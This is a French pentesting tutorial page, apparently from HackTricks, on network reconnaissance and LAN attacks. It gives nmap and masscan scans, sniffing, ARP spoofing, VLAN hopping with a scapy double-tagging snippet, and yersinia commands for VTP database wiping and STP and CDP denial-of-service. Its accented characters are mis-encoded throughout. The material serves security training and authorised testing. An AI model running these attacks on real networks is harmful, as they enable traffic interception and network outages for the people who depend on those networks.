# Pentesting R√©seau

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce pour les bug bounties** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de **bug bounties cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

## D√©couverte d'h√¥tes depuis l'ext√©rieur

Il s'agit d'une **section br√®ve** sur la mani√®re de trouver des **IPs r√©pondant** depuis **Internet**.\
Dans cette situation, vous avez un certain **p√©rim√®tre d'IPs** (peut-√™tre m√™me plusieurs **plages**) et vous souhaitez simplement d√©couvrir **quelles IPs r√©pondent**.

### ICMP

C'est la mani√®re la **plus facile** et la **plus rapide** de d√©couvrir si un h√¥te est actif ou non.\
Vous pourriez essayer d'envoyer des paquets **ICMP** et **attendre des r√©ponses**. La mani√®re la plus simple est d'envoyer une **requ√™te d'√©cho** et d'attendre la r√©ponse. Vous pouvez faire cela en utilisant un simple `ping` ou `fping` pour des **plages**.\
Vous pourriez √©galement utiliser **nmap** pour envoyer d'autres types de paquets ICMP (cela permettra d'√©viter les filtres aux requ√™tes-r√©ponses d'√©cho ICMP courantes).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### D√©couverte de ports TCP

Il est tr√®s courant de constater que tous les types de paquets ICMP sont filtr√©s. Alors, tout ce que vous pouvez faire pour v√©rifier si un h√¥te est actif est de **tenter de trouver des ports ouverts**. Chaque h√¥te a **65535 ports**, donc, si vous avez un p√©rim√®tre "important", vous **ne pouvez pas** tester si **chaque port** de chaque h√¥te est ouvert ou non, cela prendrait trop de temps.\
Dans ce cas, ce dont vous avez besoin est un **scanner de ports rapide** ([masscan](https://github.com/robertdavidgraham/masscan)) et une liste des **ports les plus utilis√©s :**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Vous pouvez √©galement effectuer cette √©tape avec `nmap`, mais c'est plus lent et `nmap` a parfois des probl√®mes pour identifier les h√¥tes actifs.

### D√©couverte de port HTTP

Il s'agit simplement d'une d√©couverte de port TCP utile lorsque vous souhaitez vous **concentrer sur la d√©couverte de services HTTP** :
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### D√©couverte de ports UDP

Vous pourriez √©galement essayer de v√©rifier si certains **ports UDP sont ouverts** pour d√©cider si vous devriez **porter plus d'attention** √† un **h√¥te.** Comme les services UDP ne **r√©pondent g√©n√©ralement pas** avec **des donn√©es** √† une sonde UDP vide classique, il est difficile de dire si un port est filtr√© ou ouvert. La mani√®re la plus simple de d√©cider est d'envoyer un paquet li√© au service en cours d'ex√©cution, et comme vous ne savez pas quel service est en cours, vous devriez essayer le plus probable en fonction du num√©ro de port :
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La ligne nmap propos√©e pr√©c√©demment testera les **1000 principaux ports UDP** sur chaque h√¥te dans la plage **/24**, mais m√™me cela prendra **>20min**. Si vous avez besoin de **r√©sultats plus rapides**, vous pouvez utiliser [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) : `./udp-proto-scanner.pl 199.66.11.53/24` Cela enverra ces **sondes UDP** √† leur **port attendu** (pour une plage /24, cela prendra juste 1 min) : _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### D√©couverte de ports SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Test de p√©n√©tration Wifi

Vous trouverez ici un excellent guide de toutes les attaques Wifi connues √† la date de r√©daction :

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## D√©couverte d'h√¥tes de l'int√©rieur

Si vous √™tes √† l'int√©rieur du r√©seau, l'une des premi√®res choses que vous voudrez faire est de **d√©couvrir d'autres h√¥tes**. Selon **le niveau de bruit** que vous pouvez/voulez g√©n√©rer, diff√©rentes actions peuvent √™tre effectu√©es :

### Passif

Vous pouvez utiliser ces outils pour d√©couvrir passivement les h√¥tes √† l'int√©rieur d'un r√©seau connect√© :
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Actif

Notez que les techniques comment√©es dans [_**D√©couverte d'h√¥tes depuis l'ext√©rieur**_](./#discovering-hosts-from-the-outside) (_D√©couverte de ports TCP/HTTP/UDP/SCTP_) peuvent √©galement √™tre **appliqu√©es ici**.\
Mais, comme vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses** :
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Notez que les techniques comment√©es dans _D√©couverte d'h√¥tes depuis l'ext√©rieur_ ([_**ICMP**_](./#icmp)) peuvent √©galement **√™tre appliqu√©es ici**.\
Mais, comme vous √™tes dans le **m√™me r√©seau** que les autres h√¥tes, vous pouvez faire **plus de choses** :

* Si vous **pinguez** une **adresse de diffusion de sous-r√©seau**, le ping devrait arriver √† **chaque h√¥te** et ils pourraient **vous r√©pondre** : `ping -b 10.10.5.255`
* En pingant l'**adresse de diffusion r√©seau**, vous pourriez m√™me trouver des h√¥tes dans **d'autres sous-r√©seaux** : `ping -b 255.255.255.255`
* Utilisez les drapeaux `-PE`, `-PP`, `-PM` de `nmap` pour effectuer la d√©couverte d'h√¥tes en envoyant respectivement des **requ√™tes d'√©cho ICMPv4**, **d'horodatage**, et **de masque de sous-r√©seau** : `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan est utilis√© pour **allumer** des ordinateurs via un **message r√©seau**. Le paquet magique utilis√© pour allumer l'ordinateur n'est qu'un paquet o√π une **MAC Dst** est fournie puis **r√©p√©t√©e 16 fois** dans le m√™me paquet.\
Ensuite, ce type de paquets est g√©n√©ralement envoy√© dans un **ethernet 0x0842** ou dans un **paquet UDP vers le port 9**.\
Si **aucun \[MAC]** n'est fourni, le paquet est envoy√© √† **l'ethernet de diffusion** (et le MAC de diffusion sera celui qui sera r√©p√©t√©).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Analyse des h√¥tes

Une fois que vous avez d√©couvert toutes les adresses IP (externes ou internes) que vous souhaitez analyser en profondeur, diff√©rentes actions peuvent √™tre effectu√©es.

### TCP

* **Port** ouvert : _SYN --> SYN/ACK --> RST_
* **Port** ferm√© : _SYN --> RST/ACK_
* **Port** filtr√© : _SYN --> \[PAS DE R√âPONSE]_
* **Port** filtr√© : _SYN --> message ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Il existe 2 options pour scanner un port UDP :

* Envoyer un **paquet UDP** et v√©rifier la r√©ponse _**ICMP unreachable**_ si le port est **ferm√©** (dans plusieurs cas, ICMP sera **filtr√©** donc vous ne recevrez aucune information si le port est ferm√© ou ouvert).
* Envoyer des **datagrammes format√©s** pour provoquer une r√©ponse d'un **service** (par exemple, DNS, DHCP, TFTP et d'autres, comme list√© dans _nmap-payloads_). Si vous recevez une **r√©ponse**, alors, le port est **ouvert**.

**Nmap** va **combiner les deux** options en utilisant "-sV" (les scans UDP sont tr√®s lents), mais notez que les scans UDP sont plus lents que les scans TCP :
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Analyse SCTP

SCTP se positionne aux c√¥t√©s de TCP et UDP. Con√ßu pour fournir le **transport** de donn√©es de **t√©l√©phonie** sur **IP**, le protocole duplique de nombreuses fonctionnalit√©s de fiabilit√© du syst√®me de signalisation 7 (SS7) et sous-tend une famille de protocoles plus large connue sous le nom de SIGTRAN. SCTP est pris en charge par des syst√®mes d'exploitation incluant IBM AIX, Oracle Solaris, HP-UX, Linux, Cisco IOS et VxWorks.

Deux types d'analyses pour SCTP sont propos√©s par nmap : _-sY_ et _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### √âvasion des IDS et IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Plus d'options nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### R√©v√©lation des adresses IP internes

Des routeurs, pare-feu et dispositifs r√©seau mal configur√©s r√©pondent parfois aux sondages r√©seau **en utilisant des adresses sources non publiques**. Vous pouvez utiliser _tcpdump_ pour **identifier les paquets** re√ßus de **adresses priv√©es** pendant les tests. Dans ce cas, l'interface _eth2_ dans Kali Linux est **adressable** depuis l'**Internet public** (Si vous √™tes **derri√®re** un **NAT** ou un **pare-feu**, ce type de paquets sera probablement **filtr√©**).
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## √âcoute passive (Sniffing)

En pratiquant l'√©coute passive, vous pouvez apprendre des d√©tails sur les plages IP, les tailles de sous-r√©seaux, les adresses MAC et les noms d'h√¥tes en examinant les trames et les paquets captur√©s. Si le r√©seau est mal configur√© ou si l'infrastructure de commutation est sous pression, les attaquants peuvent capturer du mat√©riel sensible via l'√©coute passive du r√©seau.

Si un r√©seau Ethernet commut√© est correctement configur√©, vous ne verrez que des trames de diffusion et du mat√©riel destin√© √† votre adresse MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
On peut √©galement capturer des paquets d'une machine distante via une session SSH avec Wireshark comme interface graphique en temps r√©el.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

√âvidemment.

### Capture de credentials

Vous pouvez utiliser des outils comme [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) pour analyser les credentials √† partir d'un pcap ou d'une interface en direct.

## Attaques LAN

### ARP spoofing

L'ARP Spoofing consiste √† envoyer des ARPResponses gratuits pour indiquer que l'IP d'une machine a le MAC de notre appareil. Ensuite, la victime changera la table ARP et contactera notre machine chaque fois qu'elle voudra contacter l'IP usurp√©e.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### Inondation MAC - D√©bordement CAM

D√©bordement de la table CAM du commutateur en envoyant de nombreux paquets avec diff√©rentes adresses MAC sources. Lorsque la table CAM est pleine, le commutateur commence √† se comporter comme un concentrateur (diffusant tout le trafic).
```bash
macof -i <interface>
```
Dans les commutateurs modernes, cette vuln√©rabilit√© a √©t√© corrig√©e.

### Attaques 802.1Q VLAN / DTP

#### Trunking Dynamique

**DTP (Dynamic Trunking Protocol)** est un protocole de couche de liaison con√ßu pour fournir un syst√®me de trunking automatique. Avec DTP, les commutateurs d√©cident quel port fonctionnera en mode trunk (Trunk) et lequel ne le fera pas. L'utilisation de **DTP** indique une **conception de r√©seau m√©diocre.** **Les trunks devraient √™tre strictement** l√† o√π ils sont n√©cessaires, et cela devrait √™tre document√©.

**Par d√©faut, tous les ports de commutateur fonctionnent en mode Dynamic Auto.** Cela indique que le port du commutateur est en mode d'initiation de trunk du commutateur voisin. **Le Pentester doit se connecter physiquement au commutateur et envoyer une trame DTP Desirable**, ce qui d√©clenche le passage du port en mode trunk. L'attaquant peut alors √©num√©rer les VLAN en utilisant l'analyse de trames STP et contourner la segmentation VLAN en cr√©ant des interfaces virtuelles.

De nombreux commutateurs prennent en charge le Dynamic Trunking Protocol (DTP) par d√©faut, cependant, qu'un adversaire peut abuser pour **√©muler un commutateur et recevoir le trafic de tous les VLANs**. L'outil [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) peut renifler une interface et **indique si le commutateur est en mode par d√©faut, trunk, dynamique, auto ou mode acc√®s** (ce dernier √©tant le seul qui √©viterait le saut de VLAN). L'outil indiquera si le commutateur est vuln√©rable ou non.

Si on d√©couvre que le r√©seau est vuln√©rable, vous pouvez utiliser _**Yersinia**_ pour lancer un "**activation du trunking**" en utilisant le protocole "**DTP**" et vous pourrez voir les paquets r√©seau de tous les VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
```markdown
![](<../../.gitbook/assets/image (646) (1).png>)

Pour √©num√©rer les VLANs, il est √©galement possible de g√©n√©rer la trame DTP Desirable avec le script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py). Ne pas interrompre le script sous aucun pr√©texte. Il injecte DTP Desirable toutes les trois secondes. **Les canaux de trunk cr√©√©s dynamiquement sur le commutateur ne durent que cinq minutes. Apr√®s cinq minutes, le trunk est d√©sactiv√©.**
```
```
sudo python3 DTPHijacking.py --interface eth0
```
Je tiens √† souligner que **Access/Desirable (0x03)** indique que la trame DTP est de type Desirable, ce qui indique au port de passer en mode Trunk. Et **802.1Q/802.1Q (0xa5)** indique le type d'encapsulation **802.1Q**.

En analysant les trames STP, **nous apprenons l'existence de VLAN 30 et VLAN 60.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaquer des VLANs sp√©cifiques

Une fois que vous connaissez les IDs de VLAN et les valeurs d'IP, vous pouvez **configurer une interface virtuelle pour attaquer un VLAN sp√©cifique**.\
Si DHCP n'est pas disponible, utilisez alors _ifconfig_ pour d√©finir une adresse IP statique.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saut automatique de VLAN

L'attaque discut√©e de **Dynamic Trunking et la cr√©ation d'interfaces virtuelles et la d√©couverte d'h√¥tes √† l'int√©rieur** d'autres VLANs sont **automatiquement effectu√©es** par l'outil : [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double √©tiquetage

Si un attaquant conna√Æt la valeur du **MAC, IP et VLAN ID de l'h√¥te victime**, il pourrait essayer de **doublement √©tiqueter une trame** avec son VLAN d√©sign√© et celui de la victime et envoyer un paquet. Comme la **victime ne pourra pas se connecter en retour** avec l'attaquant, la **meilleure option pour l'attaquant est de communiquer via UDP** avec des protocoles qui peuvent effectuer des actions int√©ressantes (comme SNMP).

Une autre option pour l'attaquant est de lancer un **scan de ports TCP en usurpant une IP contr√¥l√©e par l'attaquant et accessible par la victime** (probablement via internet). Ensuite, l'attaquant pourrait renifler sur le second h√¥te qu'il poss√®de s'il re√ßoit des paquets de la victime.

![](<../../.gitbook/assets/image (635) (1).png>)

Pour r√©aliser cette attaque, vous pouvez utiliser scapy : `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Contournement de la segmentation VLAN lat√©rale <a href="#d679" id="d679"></a>

Si vous avez **acc√®s √† un commutateur auquel vous √™tes directement connect√©**, vous avez la capacit√© de **contourner la segmentation VLAN** au sein du r√©seau. Il suffit de **passer le port en mode trunk** (√©galement connu sous le nom de trunk), de cr√©er des interfaces virtuelles avec les ID des VLAN cibles et de configurer une adresse IP. Vous pouvez essayer de demander l'adresse de mani√®re dynamique (DHCP) ou vous pouvez la configurer de mani√®re statique. Cela d√©pend du cas.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Contournement de VLAN priv√© de couche 3

Dans les r√©seaux sans fil pour invit√©s et autres environnements, les param√®tres de VLAN priv√© (√©galement connu sous le nom d'_isolation de port_) sont utilis√©s pour **emp√™cher les pairs d'interagir** (c'est-√†-dire, les clients **se connectent √† un point d'acc√®s sans fil mais ne peuvent pas s'adresser les uns aux autres**). Selon les ACL de r√©seau (ou leur absence), il pourrait √™tre possible d'envoyer des paquets IP jusqu'√† un routeur, qui les renvoie ensuite √† un pair voisin.

Cette attaque enverra un **paquet sp√©cialement con√ßu √† l'IP d'un client mais avec le MAC du routeur**. Ensuite, le **routeur redirigera le paquet vers le client**. Comme dans les _Attaques de Double Tagging_, vous pouvez exploiter cette vuln√©rabilit√© en contr√¥lant un h√¥te accessible par la victime.

### Attaques VTP

**VTP (VLAN Trunking Protocol)** est un protocole con√ßu pour g√©rer de mani√®re centralis√©e les VLAN. Pour suivre la base de donn√©es VLAN actuelle, les commutateurs v√©rifient des num√©ros de r√©vision sp√©ciaux. Lorsqu'une mise √† jour de la table se produit, le num√©ro de r√©vision est augment√© de un. Et si un commutateur d√©tecte une configuration avec un num√©ro de r√©vision plus √©lev√©, il mettra automatiquement √† jour sa base de donn√©es VLAN.

#### R√¥les dans un domaine VTP <a href="#ebfc" id="ebfc"></a>

* **Serveur VTP.** Un commutateur dans le r√¥le de Serveur VTP peut cr√©er de nouveaux VLAN, supprimer les anciens ou modifier les informations dans les VLAN eux-m√™mes. **Il g√©n√®re √©galement des annonces VTP pour le reste des membres du domaine.**
* **Client VTP.** Un commutateur dans ce r√¥le recevra des annonces VTP sp√©cifiques d'autres commutateurs du domaine pour mettre √† jour les bases de donn√©es VLAN sur le sien. Les clients sont limit√©s dans leur capacit√© √† cr√©er des VLAN et ne sont m√™me pas autoris√©s √† modifier la configuration VLAN localement. En d'autres termes, **acc√®s en lecture seule.**
* **Transparent VTP.** Dans ce mode, le commutateur ne participe pas aux processus VTP et peut g√©rer enti√®rement et localement toute la configuration VLAN. Lorsqu'ils fonctionnent en mode transparent, les commutateurs ne transmettent que les annonces VTP d'autres commutateurs sans affecter leur configuration VLAN. **Ces commutateurs auront toujours un num√©ro de r√©vision de z√©ro et ne peuvent pas √™tre attaqu√©s.**

#### Types d'annonces <a href="#b384" id="b384"></a>

* **Annonce sommaire ‚Äî** l'annonce VTP que le serveur VTP envoie toutes les **300 secondes (5 minutes).** Cette annonce stocke le nom de domaine VTP, la version du protocole, l'horodatage et la valeur de hachage de configuration MD5.
* **Annonce de sous-ensemble ‚Äî** c'est l'annonce VTP qui est envoy√©e chaque fois qu'un changement de configuration VLAN se produit.
* **Demande d'annonce ‚Äî** c'est une demande du client VTP au serveur VTP pour un message d'Annonce sommaire. Habituellement envoy√©e en r√©ponse √† un message qu'un commutateur a d√©tect√© une Annonce sommaire avec un num√©ro de r√©vision de configuration plus √©lev√©.

VTP peut **uniquement √™tre attaqu√© √† partir d'un port trunk,** car **les annonces VTP sont uniquement diffus√©es et re√ßues sur les ports trunk.** **Par cons√©quent, lors du pentesting apr√®s avoir attaqu√© DTP, votre prochaine cible pourrait √™tre VTP.** Pour attaquer le domaine VTP, vous pouvez **utiliser Yersinia** pour **ex√©cuter une injection VTP qui effacera l'ensemble de la base de donn√©es VLAN** et paralysera ainsi le r√©seau.

{% hint style="info" %}
Le protocole VTP a jusqu'√† **trois versions**. Dans ce post, l'attaque est contre la premi√®re version, VTPv1.
{% endhint %}
```bash
yersinia -G #For graphic mode
```
Pour effacer l'int√©gralit√© de la base de donn√©es VLAN, s√©lectionnez l'option **suppression de tous les VLAN VTP**

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### Attaques STP

**Si vous ne pouvez pas capturer de trames BPDU sur vos interfaces, il est peu probable que vous r√©ussissiez une attaque STP.**

#### **STP BPDU DoS**

L'envoi d'un grand nombre de BPDUs TCP (Notification de Changement de Topologie) ou Conf (les BPDUs qui sont envoy√©s lors de la cr√©ation de la topologie) surcharge les commutateurs et les emp√™che de fonctionner correctement.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Attaque STP TCP**

Lorsqu'un TCP est envoy√©, la table CAM des commutateurs sera supprim√©e en 15s. Ensuite, si vous envoyez continuellement ce type de paquets, la table CAM sera red√©marr√©e en continu (ou toutes les 15 secondes) et lorsqu'elle est red√©marr√©e, le commutateur se comporte comme un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Attaque de la racine STP**

L'attaquant simule le comportement d'un commutateur pour devenir la racine STP du r√©seau. Ensuite, plus de donn√©es transiteront par lui. Cela est int√©ressant lorsque vous √™tes connect√© √† deux commutateurs diff√©rents.\
Cela se fait en envoyant des paquets BPDUs CONF indiquant que la valeur de **priorit√©** est inf√©rieure √† la priorit√© r√©elle du commutateur racine actuel.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si l'attaquant est connect√© √† 2 commutateurs, il peut √™tre la racine du nouvel arbre et tout le trafic entre ces commutateurs passera par lui** (une attaque MITM sera r√©alis√©e).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Attaques CDP

Le protocole CISCO Discovery Protocol est le protocole utilis√© par les appareils CISCO pour communiquer entre eux, **d√©couvrir qui est actif** et quelles fonctionnalit√©s ils poss√®dent.

#### Collecte d'informations <a href="#0e0f" id="0e0f"></a>

**Par d√©faut, le CDP envoie des annonces √† tous ses ports.** Mais que se passe-t-il si un intrus se connecte √† un port sur le m√™me commutateur ? En utilisant un analyseur de r√©seau, que ce soit **Wireshark,** **tcpdump** ou **Yersinia**, il pourrait extraire **des informations pr√©cieuses sur l'appareil lui-m√™me**, de son mod√®le √† la version de Cisco IOS. En utilisant ces informations, il pourra √©num√©rer la m√™me version de Cisco IOS et trouver la vuln√©rabilit√©, puis l'exploiter.

#### Attaque par inondation CDP <a href="#0d6a" id="0d6a"></a>

Vous pouvez r√©aliser une attaque DoS sur un commutateur CISCO en √©puisant la m√©moire de l'appareil en simulant de v√©ritables appareils CISCO.
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
S√©lectionnez l'option **flooding CDP table** et lancez l'attaque. Le processeur du commutateur sera surcharg√©, ainsi que la table de voisins CDP, **entra√Ænant une "paralysie du r√©seau".**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### Attaque d'usurpation CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Vous pouvez √©galement utiliser [**scapy**](https://github.com/secdev/scapy/). Assurez-vous de l'installer avec le package `scapy/contrib`.

### Attaques VoIP

Bien que destin√©s √† √™tre utilis√©s par les t√©l√©phones VoIP (Voice over Internet Protocol) des employ√©s, les appareils VoIP modernes sont de plus en plus int√©gr√©s aux appareils IoT. De nombreux employ√©s peuvent maintenant d√©verrouiller des portes en utilisant un num√©ro de t√©l√©phone sp√©cial, contr√¥ler le thermostat de la pi√®ce...

L'outil [**voiphopper**](http://voiphopper.sourceforge.net) imite le comportement d'un t√©l√©phone VoIP dans les environnements Cisco, Avaya, Nortel et Alcatel-Lucent. Il d√©couvre automatiquement l'ID VLAN correct pour le r√©seau vocal en utilisant l'un des protocoles de d√©couverte d'appareils qu'il prend en charge, tels que le Cisco Discovery Protocol (CDP), le Dynamic Host Configuration Protocol (DHCP), le Link Layer Discovery Protocol Media Endpoint Discovery (LLDP-MED) et 802.1Q ARP.

